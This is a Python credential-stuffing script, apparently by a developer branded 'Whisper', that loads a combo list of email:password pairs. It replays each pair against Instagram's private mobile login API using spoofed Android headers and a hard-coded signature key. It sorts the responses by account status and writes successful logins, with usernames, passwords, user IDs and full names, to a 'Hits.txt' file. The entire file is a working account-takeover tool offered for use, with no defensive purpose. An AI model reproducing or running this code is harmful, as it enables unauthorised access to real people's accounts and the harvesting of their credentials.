import requests,random,string,os
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
def check(email,psw):
 def generate_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))
 kon = generate_random_string(10)
 length = generate_random_string(10)
 did = generate_random_string(10)
 tok = generate_random_string(10)
 en = "{\"_csrftoken\":\"" + tok + "\",\"adid\":\"" + kon + "\",\"country_codes\":\"[{\\\"country_code\\\":\\\"1\\\",\\\"source\\\":[\\\"default\\\"]}]\",\"device_id\":\"" + did + "\",\"google_tokens\":\"[]\",\"guid\":\"" + kon + "\",\"login_attempt_count\":0,\"password\":\"" + psw + "\",\"phone_id\":\"" + kon + "\",\"username\":\"" + email + "\"}"
 headers = {
        "User-Agent": "Instagram 80.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)","Pragma": "no-cache","Accept": "*/*","Cookie2": "$Version=1","Accept-Language": "en-US","X-IG-Capabilities": "3boBAA==","X-IG-Connection-Type": "WIFI","X-IG-Connection-Speed": "-1kbps","X-IG-App-ID": "567067343352427","Content-Length": str(len(en)),"Host": "i.instagram.com","Accept-Encoding": "gzip, deflate","rur": "ATN"}
 data = {"signed_body": "9387a4ccde8c044515539b8249da655d63a73093eaf7c4b45fad126aa961e45b."+en,"ig_sig_key_version": "10"}
 response = requests.post("https://i.instagram.com/api/v1/accounts/login/", headers=headers, data=data)
 source = response.json()
 if "challenge_required" in str(source):
  print(f"{B}[+] Secure : {G}{email} | {psw}")
 elif "two_factor_required" in str(source):
  print(f'{S}[+] 2FA : {B}{email} | {psw}')
 elif "The password you entered is incorrect. Please try again." in str(source):
  print(f'{E}[×] Wrong PassWord : {S}{email} | {psw}')
 elif "The username you entered doesn't appear to belong to an account. Please check your username and try again." in str(source):
  print(f'{E}[×] Wrong UserName : {S}{email} | {psw}')
 elif "Invalid Parameters" in str(source):
  print(f"{E}[×] Failure : {S}{email} | {psw}")
 elif "logged_in_user" in str(source):
  name=source['logged_in_user']["full_name"]
  pk=source['logged_in_user']["pk"]
  user=source['logged_in_user']["username"]
  devil=(f'''[√] UserName : {user}
[√] PassWord : {psw}
[+] UserID : {pk}
[+] Full Name : {name}''')
  print(G+devil)
  with open('Hits.txt','a+') as instagram:
    instagram.write(f'{devil}\n')
os.system('clear')
print(f'''{G} _    _ _     _                 
{G}| |  | | |   (_)                
{G}| |  | | |__  _ ___ _ __   ___ _ __ 
{G}| |/\| | '_ \| / __| '_ \ / _ \ '__|
{G}\  /\  / | | | \__ \ |_) |  __/ |   
{G} \/  \/|_| |_|_|___/ .__/ \___|_|   
{G}                   | |            
{G}                   |_|            
{G}[G] GitHub    : {B}@VipWhisper
{G}[I] InstaGram : {B}@Whisper_DEV
{G}[F] FaceBook  : {B}@WHISPER.DZA
{G}[T] TeleGram  : {B}@WHI3PER''')
print(f'{E}ـ'*40)
path=input(f'{B}[+] Combo List Path : {G}')
print(f'{E}ـ'*40)
for whis in open(path,'r').read().splitlines():
  acc=str(whis)
  acc=acc.split('\n')[0]
  email=acc.split(':')[0]
  psw=acc.split(':')[1].split(' ')[0]
  check(email,psw)